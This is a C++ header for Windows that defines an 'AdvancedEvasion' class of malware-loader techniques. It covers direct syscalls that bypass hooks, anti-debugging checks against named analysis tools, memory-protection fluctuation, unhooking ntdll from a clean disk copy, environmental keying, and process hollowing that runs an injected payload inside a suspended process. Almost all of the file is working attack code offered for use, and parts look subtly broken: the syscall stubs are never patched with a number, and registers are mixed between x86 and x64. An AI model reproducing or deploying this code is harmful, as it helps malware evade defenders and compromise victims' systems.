#pragma once

#include <windows.h>
#include <winternl.h>
#include <vector>
#include <string>
#include <random>
#include <functional>

// Forward declarations for syscall structures
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// Syscall numbers for Windows 10/11 (will be dynamically resolved)
struct SyscallNumbers {
    DWORD NtAllocateVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtWriteVirtualMemory;
    DWORD NtReadVirtualMemory;
    DWORD NtQuerySystemInformation;
    DWORD NtDelayExecution;
    DWORD NtOpenProcess;
    DWORD NtClose;
    DWORD NtCreateSection;
    DWORD NtMapViewOfSection;
    DWORD NtUnmapViewOfSection;
};

class AdvancedEvasion {
private:
    SyscallNumbers syscalls;
    std::mt19937 rng;
    bool syscallsInitialized;
    HMODULE ntdll;
    
    // Anti-debug state
    bool isBeingDebugged;
    std::vector<std::function<bool()>> antiDebugChecks;
    
    // Memory fluctuation
    LPVOID fluctuatingMemory;
    SIZE_T fluctuatingSize;
    DWORD originalProtection;
    bool fluctuationActive;

public:
    AdvancedEvasion() : rng(std::random_device{}()), syscallsInitialized(false), 
                       isBeingDebugged(false), fluctuatingMemory(nullptr), 
                       fluctuatingSize(0), fluctuationActive(false) {
        ntdll = GetModuleHandleA("ntdll.dll");
        initializeSyscalls();
        initializeAntiDebugChecks();
    }

    // === SYSCALL IMPLEMENTATION ===
    bool initializeSyscalls() {
        if (!ntdll) return false;
        
        // Dynamically resolve syscall numbers by parsing NTDLL
        syscalls.NtAllocateVirtualMemory = resolveSyscallNumber("NtAllocateVirtualMemory");
        syscalls.NtProtectVirtualMemory = resolveSyscallNumber("NtProtectVirtualMemory");
        syscalls.NtCreateThreadEx = resolveSyscallNumber("NtCreateThreadEx");
        syscalls.NtWriteVirtualMemory = resolveSyscallNumber("NtWriteVirtualMemory");
        syscalls.NtReadVirtualMemory = resolveSyscallNumber("NtReadVirtualMemory");
        syscalls.NtQuerySystemInformation = resolveSyscallNumber("NtQuerySystemInformation");
        syscalls.NtDelayExecution = resolveSyscallNumber("NtDelayExecution");
        syscalls.NtOpenProcess = resolveSyscallNumber("NtOpenProcess");
        syscalls.NtClose = resolveSyscallNumber("NtClose");
        syscalls.NtCreateSection = resolveSyscallNumber("NtCreateSection");
        syscalls.NtMapViewOfSection = resolveSyscallNumber("NtMapViewOfSection");
        syscalls.NtUnmapViewOfSection = resolveSyscallNumber("NtUnmapViewOfSection");
        
        syscallsInitialized = (syscalls.NtAllocateVirtualMemory != 0);
        return syscallsInitialized;
    }

    DWORD resolveSyscallNumber(const char* functionName) {
        FARPROC funcAddr = GetProcAddress(ntdll, functionName);
        if (!funcAddr) return 0;
        
        // Parse the function prologue to extract syscall number
        BYTE* bytes = (BYTE*)funcAddr;
        
        // Pattern: mov eax, <syscall_number>; mov r10, rcx; syscall
        if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && 
            bytes[3] == 0xB8) {
            // x64 pattern
            return *(DWORD*)(bytes + 4);
        } else if (bytes[0] == 0xB8) {
            // x86 pattern  
            return *(DWORD*)(bytes + 1);
        }
        
        return 0;
    }

    // Raw syscall execution
    NTSTATUS executeSyscall(DWORD syscallNumber, DWORD argCount, ...) {
        if (!syscallsInitialized) return STATUS_UNSUCCESSFUL;
        
        va_list args;
        va_start(args, argCount);
        
        // Prepare syscall arguments
        ULONG_PTR syscallArgs[16] = {0};
        for (DWORD i = 0; i < argCount && i < 16; i++) {
            syscallArgs[i] = va_arg(args, ULONG_PTR);
        }
        va_end(args);
        
#ifdef _WIN64
        // x64 syscall stub
        return ((NTSTATUS(*)(DWORD, ULONG_PTR*))getSyscallStub())(syscallNumber, syscallArgs);
#else
        // x86 syscall stub
        return ((NTSTATUS(*)(DWORD, ULONG_PTR*))getSyscallStub32())(syscallNumber, syscallArgs);
#endif
    }

    PVOID getSyscallStub() {
        static BYTE syscallStub[] = {
            0x4C, 0x8B, 0xD1,           // mov r10, rcx
            0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, syscall_number (patched)
            0x0F, 0x05,                 // syscall
            0xC3                        // ret
        };
        
        static PVOID executableStub = nullptr;
        if (!executableStub) {
            executableStub = VirtualAlloc(nullptr, sizeof(syscallStub), 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (executableStub) {
                memcpy(executableStub, syscallStub, sizeof(syscallStub));
            }
        }
        return executableStub;
    }

    PVOID getSyscallStub32() {
        static BYTE syscallStub32[] = {
            0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, syscall_number (patched)
            0xBA, 0x00, 0x00, 0x00, 0x00, // mov edx, 0x7ffe0300 (SharedUserData->SystemCallNumber)
            0xFF, 0x12,                   // call dword ptr [edx]
            0xC3                          // ret
        };
        
        static PVOID executableStub = nullptr;
        if (!executableStub) {
            executableStub = VirtualAlloc(nullptr, sizeof(syscallStub32), 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (executableStub) {
                memcpy(executableStub, syscallStub32, sizeof(syscallStub32));
                *(DWORD*)(((BYTE*)executableStub) + 6) = 0x7FFE0300; // SharedUserData
            }
        }
        return executableStub;
    }

    // === MEMORY ALLOCATION VIA SYSCALLS ===
    NTSTATUS syscallAllocateMemory(HANDLE process, PVOID* baseAddress, SIZE_T size, ULONG protect) {
        SIZE_T regionSize = size;
        return executeSyscall(syscalls.NtAllocateVirtualMemory, 6,
                            (ULONG_PTR)process, (ULONG_PTR)baseAddress, 0, 
                            (ULONG_PTR)&regionSize, MEM_COMMIT | MEM_RESERVE, protect);
    }

    NTSTATUS syscallProtectMemory(HANDLE process, PVOID baseAddress, SIZE_T size, ULONG newProtect, PULONG oldProtect) {
        SIZE_T regionSize = size;
        return executeSyscall(syscalls.NtProtectVirtualMemory, 5,
                            (ULONG_PTR)process, (ULONG_PTR)&baseAddress, 
                            (ULONG_PTR)&regionSize, newProtect, (ULONG_PTR)oldProtect);
    }

    NTSTATUS syscallWriteMemory(HANDLE process, PVOID baseAddress, PVOID buffer, SIZE_T size) {
        SIZE_T bytesWritten = 0;
        return executeSyscall(syscalls.NtWriteVirtualMemory, 5,
                            (ULONG_PTR)process, (ULONG_PTR)baseAddress, 
                            (ULONG_PTR)buffer, size, (ULONG_PTR)&bytesWritten);
    }

    // === ANTI-DEBUG TECHNIQUES ===
    void initializeAntiDebugChecks() {
        antiDebugChecks.push_back([this]() { return checkPEB(); });
        antiDebugChecks.push_back([this]() { return checkRemoteDebugger(); });
        antiDebugChecks.push_back([this]() { return checkHardwareBreakpoints(); });
        antiDebugChecks.push_back([this]() { return checkTiming(); });
        antiDebugChecks.push_back([this]() { return checkProcessName(); });
        antiDebugChecks.push_back([this]() { return checkWindowClass(); });
        antiDebugChecks.push_back([this]() { return checkDebugObjectHandle(); });
        antiDebugChecks.push_back([this]() { return checkSystemDebugger(); });
    }

    bool performAntiDebugChecks() {
        for (auto& check : antiDebugChecks) {
            if (check()) {
                isBeingDebugged = true;
                return true;
            }
            // Random delay between checks
            Sleep(rng() % 50 + 10);
        }
        return false;
    }

    bool checkPEB() {
        PPEB peb = (PPEB)__readgsqword(0x60);
        return peb->BeingDebugged || peb->NtGlobalFlag & 0x70;
    }

    bool checkRemoteDebugger() {
        BOOL debuggerPresent = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
        return debuggerPresent;
    }

    bool checkHardwareBreakpoints() {
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        GetThreadContext(GetCurrentThread(), &ctx);
        return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
    }

    bool checkTiming() {
        DWORD start = GetTickCount();
        Sleep(10);
        DWORD end = GetTickCount();
        return (end - start) > 100; // Significant timing difference
    }

    bool checkProcessName() {
        std::vector<std::string> debuggerNames = {
            "ollydbg.exe", "ida.exe", "ida64.exe", "idag.exe", "idag64.exe",
            "x32dbg.exe", "x64dbg.exe", "windbg.exe", "processhacker.exe",
            "cheatengine-x86_64.exe", "cheatengine-i386.exe"
        };
        
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe32 = {0};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        bool found = false;
        if (Process32First(snapshot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                
                for (const auto& debugger : debuggerNames) {
                    if (processName.find(debugger) != std::string::npos) {
                        found = true;
                        break;
                    }
                }
            } while (Process32Next(snapshot, &pe32) && !found);
        }
        
        CloseHandle(snapshot);
        return found;
    }

    bool checkWindowClass() {
        std::vector<std::string> debuggerClasses = {
            "OLLYDBG", "WinDbgFrameClass", "ID", "Zeta Debugger",
            "Rock Debugger", "ObsidianGUI"
        };
        
        for (const auto& className : debuggerClasses) {
            if (FindWindowA(className.c_str(), nullptr)) {
                return true;
            }
        }
        return false;
    }

    bool checkDebugObjectHandle() {
        typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(
            HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        
        pNtQueryInformationProcess NtQueryInformationProcess = 
            (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
        
        if (!NtQueryInformationProcess) return false;
        
        HANDLE debugObject = nullptr;
        NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 
            (PROCESSINFOCLASS)30, &debugObject, sizeof(debugObject), nullptr);
        
        return (status == 0 && debugObject != nullptr);
    }

    bool checkSystemDebugger() {
        return (GetSystemMetrics(SM_DEBUG) != 0);
    }

    // === MEMORY FLUCTUATION ===
    bool initializeMemoryFluctuation(LPVOID memory, SIZE_T size) {
        fluctuatingMemory = memory;
        fluctuatingSize = size;
        
        DWORD oldProtect;
        if (VirtualProtect(memory, size, PAGE_READWRITE, &oldProtect)) {
            originalProtection = oldProtect;
            fluctuationActive = true;
            return true;
        }
        return false;
    }

    void fluctuateToReadWrite() {
        if (!fluctuationActive) return;
        
        DWORD oldProtect;
        syscallProtectMemory(GetCurrentProcess(), fluctuatingMemory, 
                           fluctuatingSize, PAGE_READWRITE, &oldProtect);
    }

    void fluctuateToNoAccess() {
        if (!fluctuationActive) return;
        
        DWORD oldProtect;
        syscallProtectMemory(GetCurrentProcess(), fluctuatingMemory, 
                           fluctuatingSize, PAGE_NOACCESS, &oldProtect);
    }

    void restoreOriginalProtection() {
        if (!fluctuationActive) return;
        
        DWORD oldProtect;
        syscallProtectMemory(GetCurrentProcess(), fluctuatingMemory, 
                           fluctuatingSize, originalProtection, &oldProtect);
    }

    // === UNHOOKING ===
    bool unhookNtdll() {
        HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
        if (!ntdllModule) return false;
        
        // Get clean copy of NTDLL from disk
        HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", 
                                GENERIC_READ, FILE_SHARE_READ, nullptr, 
                                OPEN_EXISTING, 0, nullptr);
        if (file == INVALID_HANDLE_VALUE) return false;
        
        HANDLE mapping = CreateFileMappingA(file, nullptr, PAGE_READONLY, 0, 0, nullptr);
        CloseHandle(file);
        if (!mapping) return false;
        
        LPVOID cleanNtdll = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
        CloseHandle(mapping);
        if (!cleanNtdll) return false;
        
        // Parse PE headers
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)cleanNtdll;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)cleanNtdll + dosHeader->e_lfanew);
        
        // Find .text section
        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (strcmp((char*)sections[i].Name, ".text") == 0) {
                // Restore original .text section
                DWORD oldProtect;
                LPVOID textSection = (BYTE*)ntdllModule + sections[i].VirtualAddress;
                SIZE_T textSize = sections[i].Misc.VirtualSize;
                
                if (VirtualProtect(textSection, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                    memcpy(textSection, (BYTE*)cleanNtdll + sections[i].VirtualAddress, textSize);
                    VirtualProtect(textSection, textSize, oldProtect, &oldProtect);
                }
                break;
            }
        }
        
        UnmapViewOfFile(cleanNtdll);
        return true;
    }

    // === ENVIRONMENTAL KEYING ===
    std::string getEnvironmentalKey() {
        std::string key;
        
        // Computer name
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        if (GetComputerNameA(computerName, &size)) {
            key += computerName;
        }
        
        // Domain name
        char domainName[256];
        size = sizeof(domainName);
        if (GetComputerNameExA(ComputerNameDnsDomain, domainName, &size)) {
            key += domainName;
        }
        
        // Volume serial number
        DWORD volumeSerial;
        if (GetVolumeInformationA("C:\\", nullptr, 0, &volumeSerial, nullptr, nullptr, nullptr, 0)) {
            key += std::to_string(volumeSerial);
        }
        
        // Processor info
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        key += std::to_string(sysInfo.dwProcessorType);
        key += std::to_string(sysInfo.dwNumberOfProcessors);
        
        return key;
    }

    // === PROCESS HOLLOWING ===
    bool performProcessHollowing(const std::string& targetPath, const std::vector<BYTE>& payload) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        // Create suspended process
        if (!CreateProcessA(targetPath.c_str(), nullptr, nullptr, nullptr, 
                          FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
            return false;
        }
        
        // Get target image base
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        
        LPVOID imageBase;
        SIZE_T bytesRead;
        if (!ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), 
                             &imageBase, sizeof(imageBase), &bytesRead)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Unmap original image
        typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection)(HANDLE, LPVOID);
        pNtUnmapViewOfSection NtUnmapViewOfSection = 
            (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        
        if (NtUnmapViewOfSection) {
            NtUnmapViewOfSection(pi.hProcess, imageBase);
        }
        
        // Allocate memory for payload
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);
        
        LPVOID newImageBase = VirtualAllocEx(pi.hProcess, imageBase, 
                                           ntHeaders->OptionalHeader.SizeOfImage,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!newImageBase) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Write payload
        if (!WriteProcessMemory(pi.hProcess, newImageBase, payload.data(), 
                              ntHeaders->OptionalHeader.SizeOfHeaders, nullptr)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
        
        // Write sections
        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            WriteProcessMemory(pi.hProcess, 
                             (BYTE*)newImageBase + sections[i].VirtualAddress,
                             payload.data() + sections[i].PointerToRawData,
                             sections[i].SizeOfRawData, nullptr);
        }
        
        // Update context
        ctx.Eax = (DWORD)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(pi.hThread, &ctx);
        
        // Resume execution
        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return true;
    }

    // === UTILITY FUNCTIONS ===
    void randomDelay(DWORD minMs = 100, DWORD maxMs = 1000) {
        DWORD delay = rng() % (maxMs - minMs) + minMs;
        Sleep(delay);
    }

    bool isDebuggerDetected() const {
        return isBeingDebugged;
    }

    void enableStealtMode() {
        unhookNtdll();
        performAntiDebugChecks();
    }

    ~AdvancedEvasion() {
        if (fluctuationActive) {
            restoreOriginalProtection();
        }
    }
};